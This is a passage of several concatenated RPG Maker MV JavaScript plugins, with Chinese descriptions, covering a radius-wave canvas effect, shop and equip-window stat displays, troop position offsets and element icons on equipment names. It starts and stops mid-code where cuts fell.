p._radiusWaveEffect_getPos_y=function(id){
	return this.radiusWaveEffect_get(id)[1];
};
p._radiusWaveEffect_getRadiusInit=function(id){
	return this.radiusWaveEffect_get(id)[2];
};
p._radiusWaveEffect_getRadiusInc=function(id){
	return this.radiusWaveEffect_get(id)[3];
};
p._radiusWaveEffect_getThickness=function(id){
	return this.radiusWaveEffect_get(id)[4];
};
p._radiusWaveEffect_getFramesCurr=function(id){
	return this.radiusWaveEffect_get(id)[5];
};
p._radiusWaveEffect_getFramesTotal=function(id){
	return this.radiusWaveEffect_get(id)[6];
};
p._radiusWaveEffect_getFramesTotalFadeOut=function(id){
	return this.radiusWaveEffect_get(id)[7];
};
p._radiusWaveEffect_getPass2=function(id){
	return this.radiusWaveEffect_get(id)[8];
};
p._radiusWaveEffect_getAllTheWay=function(id){
	return this.radiusWaveEffect_get(id)[9];
};
p.radiusWaveEffect_incFrame=function(id,d){
	if(d===undefined) d=1;
	const rtv=this._radiusWaveEffect_getFramesCurr(id)+d;
	this._radiusWaveEffect_setFramesCurr(id,rtv);
	return rtv;
};
p.radiusWaveEffect_setPass2=function(id,val){
	const obj=this.radiusWaveEffect_get(id);
	return obj&&(obj[8]=val);
};
p.radiusWaveEffect_getPos=function(id){
	if(id>=this.radiusWaveEffect_size()) return;
	return [this._radiusWaveEffect_getPos_x(id),this._radiusWaveEffect_getPos_y(id)];
};
p.radiusWaveEffect_getCssOpacity=function(id){
	if(id>=this.radiusWaveEffect_size()) return;
	const inc=this._radiusWaveEffect_getRadiusInc(id);
	const fo=this._radiusWaveEffect_getFramesTotalFadeOut(id);
	const val=0<inc?this._radiusWaveEffect_getFramesTotal(id)-this._radiusWaveEffect_getFramesCurr(id):this._radiusWaveEffect_getFramesCurr(id);
	return val<fo?val/fo||0:1;
};
p.radiusWaveEffect_getRadius=function(id){
	if(id>=this.radiusWaveEffect_size()) return;
	const inc=this._radiusWaveEffect_getRadiusInc(id);
	let rtv=this._radiusWaveEffect_getRadiusInit(id)+this._radiusWaveEffect_getFramesCurr(id)*inc;
	//if(inc<0) rtv+=this._radiusWaveEffect_getThickness(id);
	return rtv;
};
p.radiusWaveEffect_getRadius_inner=function(id){
	if(id>=this.radiusWaveEffect_size()) return;
	return this.radiusWaveEffect_getRadius(id)-this._radiusWaveEffect_getThickness(id);
};
p.radiusWaveEffect_getPass2=function(id){
	return this._radiusWaveEffect_getPass2(id);
};
p.radiusWaveEffect_getAllTheWay=function(id){
	return this._radiusWaveEffect_getAllTheWay(id);
};
p.radiusWaveEffect_gen=function(x,y,thickness,speed,duration,fadingFrames,pass2,allTheWay,initRadius){
	if(isNaN(speed)) speed=8;
	if(!(thickness>=1)) thickness=64;
	if(!(duration>=1)) duration=128+~~(Math.random()*32);
	if(!(fadingFrames>=0)) fadingFrames=16+~~(Math.random()*4);
	if(isNaN(initRadius)){
		if(speed<0) initRadius=duration*-speed;
		else initRadius=0;
	}else initRadius+=thickness;
	return this.radiusWaveEffect_push([x,y,initRadius||0,speed,thickness,0,duration,fadingFrames,pass2,allTheWay]);
};
}

{ const p=Graphics;
k='renderOtherEffects';
r=p[k]; (p[k] = function f(){
	if($gameScreen) this.renderRadiusWaveEffect();
	return f.ori.apply(this,arguments);
}).ori=r;
t=p.renderRadiusWaveEffect=function f(){
	const canvasId='radiusWaveEffect',d=document;
	const c=this._canvas;
	const shrinkBits=f.tbl2[1];
	const blurPx=f.tbl2[2];
	const w=c.width>>shrinkBits,h=c.height>>shrinkBits;
	
	let gc2=f.gc2||d.getElementById(canvasId);
	if(!gc2){
		gc2=f.gc2=d.createElement('canvas');
		gc2.setAttribute('id',canvasId);
		gc2.setAttribute('style',c.getAttribute('style'));
		d.body.appendChild(gc2);
		gc2.width =w;
		gc2.height=h;
		this.renderEffects_sortCanvas();
	}
	const effCnt=$gameScreen.radiusWaveEffect_size();
	gc2.style.display=effCnt?'':'none';
	if(gc2.width !==w) gc2.width =w;
	if(gc2.height!==h) gc2.height=h;
	if(gc2._blurPx!==blurPx){
		gc2._blurPx=blurPx;
		gc2.style.filter="blur("+blurPx+"px)";
	}
	
	if(gc2.style.width!==c.style.width) gc2.style.width=c.style.width;
	if(gc2.style.height!==c.style.height) gc2.style.height=c.style.height;
	const fc=this.refGameSystem_isCurrent()?this.frameCount:(this.refGameSystem_set(),$gameSystem._framesOnSave||0);
	const dfc=fc-f.tbl2[0]||0;
	f.tbl2[0]=fc;
	if(Graphics.frameCount<f.tbl2[0]) f.tbl2[0]=Graphics.frameCount; // new game or load game
	if(!(0<dfc)) return; // NaN||0 not inited yet or too eager
	
	const mwh2=Math.max(c.width,c.height)<<1,mwhs=Math.max(w,h)<<1;
	const ctx2=gc2.getContext('2d'); ctx2.clearRect(0,0,w,h);
	for(let x=0,xs=effCnt,unit=1<<shrinkBits,r,r2,ri,rs,rs2,ris,alpha,tmpc=f.tmpc,xyss,tmpctx,grd,pass2,xy,xo,yo,xe,ye,xso,yso,xse,yse,allTheWay,tmp;x!==xs;++x){
		r=$gameScreen.radiusWaveEffect_getRadius(x);
		ri=$gameScreen.radiusWaveEffect_getRadius_inner(x);
		alpha=$gameScreen.radiusWaveEffect_getCssOpacity(x);
		pass2=$gameScreen.radiusWaveEffect_getPass2(x);
		xy=$gameScreen.radiusWaveEffect_getPos(x);
		allTheWay=$gameScreen.radiusWaveEffect_getAllTheWay(x);
		
		rs=r/unit;
		ris=ri/unit;
		xe=xo=xy[0]-r;
		ye=yo=xy[1]-r;
		tmp=unit>>1;
		tmp=0;
		xo-=tmp;
		yo-=tmp;
		tmp=0;
		tmp+=(r2=r*2+1);
		xe+=tmp;
		ye+=tmp;
		const shiftxs=(-Math.min(xo,0)+unit-1)>>shrinkBits;
		const shiftys=(-Math.min(yo,0)+unit-1)>>shrinkBits;
		const shiftx=shiftxs<<shrinkBits;
		const shifty=shiftys<<shrinkBits;
		const cx=(xo+shiftx)>>shrinkBits<<shrinkBits;
		const cy=(yo+shifty)>>shrinkBits<<shrinkBits;
		const srcw=(Math.min(r2,Math.min(xe,c.width )-cx)+unit-1)>>shrinkBits<<shrinkBits;
		const srch=(Math.min(r2,Math.min(ye,c.height)-cy)+unit-1)>>shrinkBits<<shrinkBits;
		if(!(srcw>=unit&&srch>=unit)){
			$gameScreen.radiusWaveEffect_incFrame(x,dfc);
			continue;
		}
		// edit w,h will clear canvas
		tmpc.width =srcw>>shrinkBits;
		tmpc.height=srch>>shrinkBits;
		rs2=Math.ceil(rs*2+1);
		
		tmpctx=tmpc.getContext('2d');
		tmpctx.globalCompositeOperation='source-over';
		{
			if(ri>=0){
				if(allTheWay){
					grd=tmpctx.createRadialGradient(rs-shiftxs,rs-shiftys,ris,rs-shiftxs,rs-shiftys,rs);
					grd.addColorStop(f.tbl[0], "rgba(0,0,0,"+alpha+")");
					grd.addColorStop(f.tbl[2], "rgba(0,0,0,"+alpha+")");
					grd.addColorStop(f.tbl[3], "rgba(0,0,0,0)");
				}else{
					grd=tmpctx.createRadialGradient(rs-shiftxs,rs-shiftys,ris,rs-shiftxs,rs-shiftys,rs);
					grd.addColorStop(f.tbl[0], "rgba(0,0,0,0)");
					grd.addColorStop(f.tbl[1], "rgba(0,0,0,"+alpha+")");
					grd.addColorStop(f.tbl[2], "rgba(0,0,0,"+alpha+")");
					grd.addColorStop(f.tbl[3], "rgba(0,0,0,0)");
				}
			}else if(r>0){
				grd=tmpctx.createRadialGradient(rs-shiftxs,rs-shiftys,0,rs-shiftxs,rs-shiftys,rs);
				const r0=1-r/(r-ri);
				const unit=1-r0;
				if(r0<f.tbl[0]){
				}else if(r0<f.tbl[1]){
					if(allTheWay) grd.addColorStop(f.tbl[0], "rgba(0,0,0,"+alpha+")");
					else{
						grd.addColorStop(f.tbl[0], "rgba(0,0,0,"+((r0-f.tbl[0])/(f.tbl[1]-f.tbl[0]))*alpha+")");
						grd.addColorStop((f.tbl[1]-r0)/unit, "rgba(0,0,0,"+alpha+")");
					}
					grd.addColorStop((f.tbl[2]-r0)/unit, "rgba(0,0,0,"+alpha+")");
					grd.addColorStop((f.tbl[3]-r0)/unit, "rgba(0,0,0,0)");
				}else if(r0<f.tbl[2]){
					grd.addColorStop(f.tbl[0], "rgba(0,0,0,"+alpha+")");
					grd.addColorStop((f.tbl[2]-r0)/unit, "rgba(0,0,0,"+alpha+")");
					grd.addColorStop((f.tbl[3]-r0)/unit, "rgba(0,0,0,0)");
				}else{
					grd.addColorStop(f.tbl[0], "rgba(0,0,0,"+(1-(r0-f.tbl[2])/(f.tbl[3]-f.tbl[2]))*alpha+")");
					grd.addColorStop((f.tbl[3]-r0)/unit, "rgba(0,0,0,0)");
				}
			}
			tmpctx.fillStyle = grd;
			tmpctx.fillRect(0,0,tmpc.width,tmpc.height);
		}
		tmpctx.globalCompositeOperation="source-in";
		{
			const xy=$gameScreen.radiusWaveEffect_getPos(x);
			if(pass2){
				const tmpc2=f.tmpc2;
				tmpc2.width =tmpc.width ;
				tmpc2.height=tmpc.height;
				const tmpctx2=tmpc2.getContext('2d');
				tmpctx2.fillStyle=pass2[1]||f.tbl2[3][1];
				tmpctx2.fillRect(0,0,tmpc.width,tmpc.height);
				tmpctx2.globalCompositeOperation=pass2[0]||f.tbl2[3][0];
				tmpctx2.drawImage(c,
					cx,cy,srcw,srch,
					0,0,tmpc.width,tmpc.height,
				);
				tmpctx.drawImage(tmpc2,0,0);
			}else{
				tmpctx.drawImage(c,
					cx,cy,srcw,srch,
					0,0,tmpc.width,tmpc.height,
				);
			}
			ctx2.drawImage(tmpc,cx>>shrinkBits,cy>>shrinkBits);
		}
		
		$gameScreen.radiusWaveEffect_incFrame(x,dfc);
	}
	$gameScreen.radiusWaveEffect_arrange();
};
t.tbl=[0,0.125,0.875,1]; // cut points: transparent,solid,solid,transparent
t.tbl2=[undefined,3,2,['difference','rgba(255,255,255,1)',]]; // 上一次進函式時的frameCount,shrinkBits,blur_px
t.tmpc=document.createElement('canvas');
t.gc2=undefined;
t.tmpc2=document.createElement('canvas');
}

{ const p=BattleManager;
p.radiusWaveEffect_genAtBtlr=function f(btlr,dx,dy,thickness,speed,duration,fadeOutFrames,pass2,allTheWay,initRadius){
	if(btlr&&btlr.constructor===Array){
		for(let x=0;x!==btlr.length;++x) f.call(this,btlr[x],dx,dy,thickness,speed,duration,fadeOutFrames,pass2,allTheWay,initRadius);
		return;
	}
	const sc=SceneManager._scene;
	const sp=sc._btlr2sp&&sc._btlr2sp.get(btlr); if(!sp) return;
	dx|=0; dy|=0;
	return $gameScreen.radiusWaveEffect_gen(sp.x+dx,sp.y+dy,thickness,speed,duration,fadeOutFrames,pass2,allTheWay,initRadius);
};
p.radiusWaveEffect_genAtTarget=function f(dx,dy,thickness,speed,duration,fadeOutFrames,pass2,allTheWay,initRadius){
	return this.radiusWaveEffect_genAtBtlr(this._targets,dx,dy,thickness,speed,duration,fadeOutFrames,pass2,allTheWay,initRadius);
};
p.radiusWaveEffect_genAtSubject=function f(dx,dy,thickness,speed,duration,fadeOutFrames,pass2,allTheWay,initRadius){
	return this.radiusWaveEffect_genAtBtlr(this._subject,dx,dy,thickness,speed,duration,fadeOutFrames,pass2,allTheWay,initRadius);
};
}

{ const p=Game_Character.prototype;
p.radiusWaveEffect_gen=function(dx,dy,thickness,speed,duration,fadeOutFrames,pass2,allTheWay,initRadius){
	const sc=SceneManager._scene;
	const sp=sc._chr2sp&&sc._chr2sp.get(this); if(!sp) return;
	dx|=0; dy|=0;
	return $gameScreen.radiusWaveEffect_gen(sp.x+dx,sp.y+dy,thickness,speed,duration,fadeOutFrames,pass2,allTheWay,initRadius);
};
}

})();


﻿"use strict";
/*:
 * @plugindesc 商店裝備顯示8維能力變化
 * @author agold404
 * @help as title
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Scene_Shop.prototype;
p.adjustWindowPos=function(){
	const sepx=(Graphics.width>>1)-(Graphics.width>>3);
	const wb=this._buyWindow,wn=this._numberWindow,wst=this._statusWindow;
	const dx=wst.x-sepx;
	wst.x-=dx;
	wst.width+=dx;
	wb.width-=dx;
	wn.width-=dx;
	wst.createContents();
	wb.createContents();
	wn.createContents();
	wn._stat=wb._stat=wst;
	wst._idxLast=wst._idx=0;
};
k='create';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	this.adjustWindowPos();
	return rtv;
}).ori=r;
}

(t=function f(){
	const x=TouchInput.x,y=TouchInput.y;
	let hit=0;
	if(f.tbl(this._stat. _leftArrowSprite,x,y)) this.cursorLeft (hit|=true);
	if(f.tbl(this._stat._rightArrowSprite,x,y)) this.cursorRight(hit|=true);
	if(hit) return this._touching=true;
}).tbl=(sp,x,y)=>{
	const pos=sp.getGlobalPosition();
	const w=sp.width ;
	const xb=pos.x-w;
	const xe=pos.x+w;
	const h=sp.height;
	const yb=pos.y-h;
	const ye=pos.y+h;
	return x>=xb&&x<=xe&&y>=yb&&y<=ye;
};

{ const p=Window_ShopBuy.prototype;
k='cursorLeft';
r=p[k]; (p[k]=function f(){
	if(!this._stat) return f.ori.apply(this,arguments);
	--this._stat._idx;
	this._stat.refresh();
}).ori=r;
k='cursorRight';
r=p[k]; (p[k]=function f(){
	if(!this._stat) return f.ori.apply(this,arguments);
	++this._stat._idx;
	this._stat.refresh();
}).ori=r;
p.processTouch_changeActor=t;
k='processTouch';
r=p[k]; (p[k]=function f(){
	if(this._stat && this.isOpenAndActive() && TouchInput.isTriggered() && this.processTouch_changeActor()) return true;
	return f.ori.apply(this,arguments);
}).ori=r;
}

{ const p=Window_ShopNumber.prototype;
p.processTouch_changeActor=t;
k='processTouch';
r=p[k]; (p[k]=function f(){
	if(this._stat && this.isOpenAndActive() && TouchInput.isTriggered() && this.processTouch_changeActor()) return true;
	return f.ori.apply(this,arguments);
}).ori=r;
k='drawMultiplicationSign';
r=p[k]; (p[k]=function f(){
	const width=this.textWidth(f.tbl);
	const x=this.cursorX()-(width<<1);
	const y=this.itemY();
	this.resetTextColor();
	this.drawText(f.tbl, x, y, width);
	return [x-width,y,width<<1];
}).ori=r;
p[k].tbl='\u00d7';
k='refresh';
r=p[k]; (p[k]=function f(){
	this.contents.clear();
	let res;
	res=this.drawMultiplicationSign();
	this.drawItemName(this._item, f.tbl.xb, this.itemY(), res[0]-f.tbl.xb);
	this.drawNumber();
	this.drawTotalPrice();
}).ori=r;
p[k].tbl={
	xb:0,
};
k='cursorUp';
r=p[k]; (p[k]=function f(){
	this.changeNumber(f.tbl[0]*(1+(Input.isPressed('shift')||Input.isLongPressed(f.tbl[1],f.tbl[2]))*9));
}).ori=r;
p[k].tbl=[1,'up',75];
k='cursorDown';
r=p[k]; (p[k]=function f(){
	this.changeNumber(f.tbl[0]*(1+(Input.isPressed('shift')||Input.isLongPressed(f.tbl[1],f.tbl[2]))*9));
}).ori=r;
p[k].tbl=[-1,'down',75];
k='cursorLeft';
r=p[k]; (p[k]=function f(){
	if(!this._stat) return this.cursorDown();
	--this._stat._idx;
	this._stat.refresh();
}).ori=r;
k='cursorRight';
r=p[k]; (p[k]=function f(){
	if(!this._stat) return this.cursorUp();
	++this._stat._idx;
	this._stat.refresh();
}).ori=r;
k='processNumberChange';
r=p[k]; (p[k]=function f(){
	if(!this._stat) return f.ori.apply(this,arguments);
	if (this.isOpenAndActive()) {
		if(Input.isRepeated('up')) this.cursorUp();
		if(Input.isRepeated('down')) this.cursorDown();
		if(Input.isRepeated('left')) this.cursorLeft();
		if(Input.isRepeated('right')) this.cursorRight();
	}
}).ori=r;
k='placeButtons';
r=p[k]; (p[k]=function f(from,to,dy){
	from=from|0;
	if(from===to) return;
	dy=dy|0;
	const numBtn_amounts=to===undefined?f.tbl.sep:to;
	let w=-f.tbl.spc,i=0,x=0,h=0,btn;
	for(i=from;i!==numBtn_amounts;++i) w+=this._buttons[i].width+f.tbl.spc;
	x=(this.width-w)>>1;
	for(i=from;i!==numBtn_amounts;++i){
		btn=this._buttons[i];
		btn.x=x;
		btn.y=this.buttonY()+dy;
		x+=btn.width+f.tbl.spc;
		if(h<btn.height) h=btn.height;
	}
	f.call(this,numBtn_amounts,this._buttons.length,h+dy+f.tbl.spc);
}).ori=r;
p[k].tbl={
	sep:4,
	spc:16,
};
}

{ const p=Window_ShopStatus.prototype;
p._lrArrows=function(noCreate){
	let la=this._leftArrowSprite ; if(!la&&!noCreate) la=this._leftArrowSprite =new Sprite();
	let ra=this._rightArrowSprite; if(!ra&&!noCreate) ra=this._rightArrowSprite=new Sprite();
	return [la,ra];
};
k='initialize';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	const aa=this._lrArrows();
	const la=aa[0],ra=aa[1];
	la.visible=ra.visible=0;
	this.addChild(la);
	this.addChild(ra);
	return rtv;
}).ori=r;
k='_refreshArrows';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	const aa=this._lrArrows();
	const la=aa[0],ra=aa[1];
	const w = this._width;
	const h = this._height;
	const p = 24;
	const q = p>>1;
	const r = (q>>1)+q;
	const sx = 144-(q>>1);
	const sy =  48-q;
	ra.bitmap = this._windowskin;
	ra.anchor.x = 0.5;
	ra.anchor.y = 0.5;
	ra.setFrame(sx+r, sy, q, p);
	ra.move(w-q, h>>1);
	la.bitmap = this._windowskin;
	la.anchor.x = 0.5;
	la.anchor.y = 0.5;
	la.setFrame(sx-r, sy, q, p);
	la.move(q, h>>1);
	return rtv;
}).ori=r;
k='update';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	const aa=this._lrArrows(true);
	if(aa[0]||aa[1]){
		this._tickCurr|=0;
		const s=(Math.sin(Math.PI*this._tickCurr/f.tbl.tickMax)+1)/2;
		if(aa[0]) aa[0].anchor.x=1-s;
		if(aa[1]) aa[1].anchor.x=s;
		++this._tickCurr;
		this._tickCurr%=f.tbl.tickMax;
	}
	return rtv;
}).ori=r;
p[k].tbl={
	tickMax:64,
};
k='refresh';
r=p[k]; (p[k]=function f(){
	this.contents.clear();
	if(this._item){
		const x=this.textPadding() , y=0;
		this.drawPossession(x, y);
		if(this.isEquipItem()){
			let seph=this.lineHeight();
			seph+=seph>>1;
			this.drawEquipInfo(x,seph+y,seph);
		}else this._lrArrows().forEach(f.tbl,false);
	}
}).ori=r;
p[k].tbl=function(arrow){ arrow.visible=this; };
k='drawEquipInfo';
r=p[k]; (p[k]=function f(x,y,seph){
	const members=$gameParty.members();
	const L=members.length;
	const aa=this._lrArrows();
	if((aa[0].visible=aa[1].visible=1<L)){
		this._idx%=L;
		this._idx+=L;
		this._idx%=L;
	}else this._idx=0;
	if(this._idxLast!==this._idx) SoundManager.playCursor();
	const actor=members[this._idxLast=this._idx];
	if(actor){
		this.drawActorEquipInfo(x,y,actor,seph);
	}
}).ori=r;
k='drawActorEquipInfo';
r=p[k]; (p[k]=function f(x,y,actor,seph){
	const enabled=actor.canEquip(this._item);
	this.changePaintOpacity(enabled);
	this.resetTextColor();
	this.drawText(actor.name(),x,y,168);
	const item=this.currentEquippedItem(actor,this._item.etypeId);
	y+=this.lineHeight();
	this.drawItemName(item,x,y);
	if(enabled) this.drawActorParamChange(x,(this.lineHeight()>>1)+seph+y,actor,item,seph);
	this.changePaintOpacity(true);
}).ori=r;
k='drawActorParamChange';
r=p[k]; (p[k]=function f(x,y,actor,item,seph){
	const xe=this.contents.width-this.textPadding();
	const w=(xe-x+f.tbl.sepx)/f.tbl.col;
	const paramsCurr=item&&item.params||f.tbl._none,paramsOther=this._item.params||f.tbl._none;
	const lh=this.lineHeight();
	const dy=seph;
	for(let i=0,j=0,idx=0;idx!==f.tbl.idEnd;++j){ for(i=0;idx!==f.tbl.idEnd && i!==f.tbl.col;++i,++idx){
		const delta=(paramsOther[idx]||0)-(paramsCurr[idx]||0);
		this.changeTextColor(this.paramchangeTextColor(delta));
		this.drawText( TextManager.param(idx) ,i*w+x,j*dy+y,w-f.tbl.sepx,  'left');
		this.drawText( (delta<0?'':'+')+delta ,i*w+x,j*dy+y,w-f.tbl.sepx, 'right');
	} }
}).ori=r;
p[k].tbl={
	_none:[],
	col:2,
	idEnd:8,
	sepx:64,
};
k='standardFontSize';
r=p[k]; (p[k]=function f(){
	return f.tbl;
}).ori=r;
p[k].tbl=24;
}

})();


﻿"use strict";
/*:
 * @plugindesc (垃圾MOG) 裝備更換視窗改為顯示8維
 * @author agold404
 * @help as title
 * 
 * This plugin can be renamed as you want.
 */

if('undefined'!==typeof Moghunter)(()=>{ let k,r,t;

{ const p=Window_EquipStatus.prototype;
k='windowHeight';
r=p[k]; (p[k]=function f(){
	return f.tbl;
}).ori=r;
p[k].tbl=400;
k='refresh';
r=p[k]; (p[k]=function f(){
	this.contents.clear();
	this.contents.fontSize = Moghunter.scEquip_FontSize;
	if(this._actor){
		this._parData[0] = this._parImg.width / 3;
		this._parData[1] = this._parImg.height;
		if(!this._faceSprite) this.createFaceSprite();
		this.refreshFaceSprite();
		this.drawActorName(this._actor, f.tbl.pos_name.x+this.textPadding(), f.tbl.pos_name.y);
		let lh=this.standardFontSize(); lh+=lh>>3;
		for(let i=0;i!==f.tbl.idEnd;++i) this.drawItem(0, f.tbl.yb+lh*(i+1),i);
	}
}).ori=r;
p[k].tbl={
	idEnd:8,
	yb:53,
	pos_name:{x:0,y:39,},
};
k='createFaceSprite';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	const fsp=this._faceSprite;
	fsp.x=f.tbl.x;
	fsp.y=f.tbl.y;
	return rtv;
}).ori=r;
p[k].tbl={
	x:168,
	y:0,
};
k='drawItem';
r=p[k]; (p[k]=function f(x, y, paramId){
	this.drawParamName(x + this.textPadding(), y, paramId);
	if(this._actor){
		this.drawCurrentParam(x + f.tbl.offset_currParam, y, paramId);
		if(this._tempActor) this.drawRightArrowM(x + f.tbl.offset_arrow, y + 6,paramId);
	}
	if(this._tempActor) this.drawNewParam(x + f.tbl.offset_newParam, y, paramId);
}).ori=r;
p[k].tbl={
	offset_currParam:120,
	offset_arrow:174,
	offset_newParam:202,
};
}

})();


﻿"use strict";
/*:
 * @plugindesc (need troop meta) by troop offset x,y
 * @author agold404
 * @help as title
 * in troop page with comment: @NOTE
 * use comment: <offsetXY:number_for_offset_x,number_for_offfset_y>
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Sprite_Actor.prototype;
k='setActorHome';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	const troop=$gameTroop.troop();
	if(troop && troop.meta && troop.meta.offsetXY){
		const xy=troop.meta.offsetXY.split(',').map(Number);
		this._homeX+=xy[0]||0;
		this._homeY+=xy[1]||0;
		this.moveToStartPosition();
	}
	return rtv;
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 裝備名稱上放屬性icon
 * @author agold404
 * @help as title
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t; const iconPad2=8;

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	$dataSystem.elements._icons=f.tbl;
	return rtv;
}).ori=r;
p[k].tbl={
_add:[
	undefined,
	97, // 斬
	103, // 刺
	110, // 鈍
	64, // 火
	66, // 雷
	65, // 冰
	69, // 風
	68, // 土
	67, // 水
	70, // 光
	71, // 暗
	77, // 爆
],
_atk:[
	undefined,
	1676, // 斬
	1677, // 刺
	1678, // 鈍
	1658, // 火
	1660, // 雷
	1659, // 冰
	1663, // 風
	1662, // 土
	1661, // 水
	1674, // 光
	1675, // 暗
	1679, // 爆
],
_def:[
	undefined,
	1688, // 斬
	1689, // 刺
	1690, // 鈍
	1680, // 火
	1682, // 雷
	1681, // 冰
	1685, // 風
	1684, // 土
	1683, // 水
	1686, // 光
	1687, // 暗
	1691, // 爆
],
};
}

{ const p=Scene_Boot.prototype;
t={
parseAdd:(dataobj,eles)=>{
	// ele add
	for(let x=0,arr=dataobj.traits;x!==arr.length;++x) if(arr[x].code===Game_BattlerBase.TRAIT_ATTACK_ELEMENT) eles.push(arr[x].dataId);
},
parseRate:(dataobj)=>{
	// ele atk rate , ele def rate
	
	let icons=dataobj.equipEleIcons; if(!icons) icons=dataobj.equipEleIcons=[];
	
	const tbl=$dataSystem.elements._icons,tmparr=[],rate=new Map();
	
	for(let x=0,arr=dataobj.traits;x!==arr.length;++x){ if(arr[x].code===Game_BattlerBase.TRAIT_屬性傷害倍率){
		const id=arr[x].dataId;
		let r=rate.get(id);
		if(r===undefined) r=1;
		rate.set(id,r*arr[x].value);
		tmparr.push(id);
	} }
	for(let x=0;x!==tmparr.length;++x){
		const id=tmparr[x];
		const icon=tbl._atk[id],r=rate.get(id);
		if(r!==undefined && r!==1 && icon>0){
			const val=Math.round(r*100)-100;
			icons.push([icon,(val>=0?"+":"")+val+"%"]);
		}
	}
	tmparr.length=0; rate.clear();
	
	for(let x=0,arr=dataobj.traits;x!==arr.length;++x){ if(arr[x].code===Game_BattlerBase.TRAIT_ELEMENT_RATE){
		const id=arr[x].dataId;
		let r=rate.get(id);
		if(r===undefined) r=1;
		rate.set(id,r*arr[x].value);
		tmparr.push(id);
	} }
	for(let x=0;x!==tmparr.length;++x){
		const id=tmparr[x];
		const icon=tbl._def[id],r=rate.get(id);
		if(r!==undefined && r!==1 && icon>0){
			const val=100-Math.round(r*100);
			icons.push([icon,(val>=0?"+":"")+val+"%"]);
		}
	}
	tmparr.length=0; rate.clear();
},
putAdd:(dataobj,arr_add)=>{
	let icons=dataobj.equipEleIcons; if(!icons) icons=dataobj.equipEleIcons=[];
	for(let x=0,arr=arr_add;x!==arr.length;++x) icons.push([$dataSystem.elements._icons._add[arr[x]],undefined]);
},
};
(p.equipEleParse_weapon=function f(dataobj){ if(!dataobj) return;
	const ele_add=[];
	
	const skill=$dataSkills[eval(dataobj.meta.skill_id)-0||1];
	if(skill.damage.elementId<0) f.tbl.parseAdd(dataobj,ele_add);
	else ele_add.push(skill.damage.elementId);
	if(skill.addEle) for(let x=0,arr=skill.addEle;x!==arr.length;++x) ele_add.push(arr[x]);
	f.tbl.putAdd(dataobj,ele_add);
	
	f.tbl.parseRate(dataobj);
}).tbl=t;
(p.equipEleParse_armor=function f(dataobj){ if(!dataobj) return;
	const ele_add=[];
	
	f.tbl.parseAdd(dataobj,ele_add);
	f.tbl.putAdd(dataobj,ele_add);
	
	f.tbl.parseRate(dataobj);
}).tbl=t;
k='start';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	$dataWeapons.forEach(this.equipEleParse_weapon,this);
	$dataArmors .forEach(this.equipEleParse_armor ,this);
	return rtv;
}).ori=r;
}

{ const p=Window_Base.prototype;
k='drawItemName';
r=p[k]; (p[k]=function f(item, x, y, width){
	let rtv=-1;
	width = width || 312;
	if(item){
		rtv=0;
		const iconBoxWidth = Window_Base._iconWidth + 4;
		rtv+=iconBoxWidth;
		this.resetTextColor();
		this.drawIcon(item.iconIndex, x + 2, y + 2, item);
		this.drawText(item.name, x + iconBoxWidth, y, width - iconBoxWidth);
		rtv+=this.textWidth(item.name);
		rtv=Math.ceil(rtv);
	}
	return rtv;
}).ori=r;
}

{ const p=Window_ChoiceList.prototype;
k='commandName';
r=p[k]; (p[k]=function f(idx){ return this._list[idx] && f.ori.apply(this,arguments); }).ori=r;
}

{ const p=Window_Selectable.prototype;
p.drawEquipEle_clearIcon=function(idx){
	const conf=this._currEleIconConf;
	if(!conf || !this.contents) return;
	if(idx>=0&&!conf[1].equals(this.itemRect(idx))) return; // coord diverge === refreshed
	const xb=conf[4];
	const yb=conf[5];
	const w=conf[6]-xb;
	const h=conf[7]-yb;
	this.contents.clearRect(xb, yb, w, h);
	return true;
};
p.drawEquipEle_onSel=function(idxPre){
	const idxCurr=this.index();
	if(idxPre!==idxCurr){
		this.redrawItem(idxPre); // will check >=0
		this.drawEquipEle_clearIcon(idxPre);
		this._equipEleCtr=0;
		this._equipEleIdxLast=undefined;
		this._currEleIconConf=undefined;
	}
	if(idxCurr>=0){
		this.clearItem(idxCurr);
		this._currEleIconConf=this.drawItem(idxCurr);
		this.drawEquipEle_refreshIcon(true);
	}
};
(p.drawEquipEle_refreshIcon=function f(forced){
	if(!this._currEleIconConf) return;
	const idx=~~(this._equipEleCtr/f.tbl.changeIconFrame);
	const conf=this._currEleIconConf;
	if(!conf[0]) return;
	const icons=conf[0].equipEleIcons||f.tbl._none;
	if(idx<icons.length&&conf[1].equals(this.itemRect(this.index()))){ // coord diverge === refreshed
		if(1 || forced || this._equipEleIdxLast!==idx){
			this.changePaintOpacity(conf[2]);
			const quotew=conf[3],xe=conf[6],ye=conf[7],yb=conf[5];
			let xb=conf[4];
			
			const w=xe-xb,h=ye-yb;
			this.drawEquipEle_clearIcon();
			const maxCnt=Math.min(~~((w-(quotew<<1))/(Window_Base._iconWidth+f.tbl.iconPad2)),icons.length);
			if(maxCnt>=1){
				xb=xe-(quotew<<1)-maxCnt*(Window_Base._iconWidth+f.tbl.iconPad2);
				// this.drawText('[',xb,yb);
				// this.drawText(']',xe-quotew,yb);
				for(let i=0,idxb=maxCnt<icons.length?idx:0,x=xb+quotew,dx=Window_Base._iconWidth+f.tbl.iconPad2,p=(Math.max((f.tbl.iconPad2>>2),1)||1)|0,rateY=(this.standardFontSize()>>2)+yb;i!==maxCnt;x+=dx,++i){
					const idxR=(idxb+i)%icons.length;
					this.drawIcon(icons[idxR][0],(f.tbl.iconPad2>>1)+x,yb);
					if(icons[idxR][1]!==undefined){
						const fs=this.contents.fontSize;
						this.contents.fontSize=f.tbl.fontSize;
						this.drawText(icons[idxR][1],x+p,rateY,dx-(p<<1),'right');
						this.contents.fontSize=fs;
					}
